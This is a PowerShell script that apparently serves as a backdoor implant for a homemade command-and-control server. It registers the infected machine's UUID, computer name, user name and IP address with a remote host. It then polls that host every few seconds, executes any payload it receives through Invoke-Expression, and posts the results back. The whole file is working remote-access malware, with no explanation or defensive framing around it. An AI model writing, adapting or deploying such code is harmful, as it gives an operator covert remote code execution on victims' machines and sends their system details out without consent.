$uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
# URL NEEDS TO BE CHANGED ONCE DEPLOYED

$register_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/register/"

$env:HostIP = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

$Body = @{
   uuid = $uuid
   name = $env:computername
   description = $env:UserName
   ip = $env:HostIP
   status = "True"
}
Invoke-RestMethod -Method 'Post' -Uri $register_url -Body $body

$url = "http://dilkovak-ubuntuvm.mshome.net:8000/payloads/backdoor_api/" + $uuid 
$log_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/log/"
$payload_search_url = "http://dilkovak-ubuntuvm.mshome.net:8000/api/payload/?payload=&payload_name="

while ($true) {
	Start-Sleep -Seconds 3
	$response = Invoke-RestMethod -Method 'Get' -Uri $url
	if ($response.active -eq $true -and $uuid.equals($response.uuid)){
		# Write-Output $response.payload
		$payload_query_url = $payload_search_url + $response.payload_name
		# need to convert it to json format when sending to the server
		$payload_response = Invoke-RestMethod -Method 'Get' -Uri $payload_query_url
		$output = Invoke-Expression $response.payload | ConvertTo-Json
		if (!$output){
			$output = "Script executed succesfully, but there was no output!"
		}
		$output
		$Body = @{content = $output
			connection = $uuid
			payload = $payload_response.id
		}
		Invoke-RestMethod -Method 'Post' -Uri $log_url -Body $body
	}
}
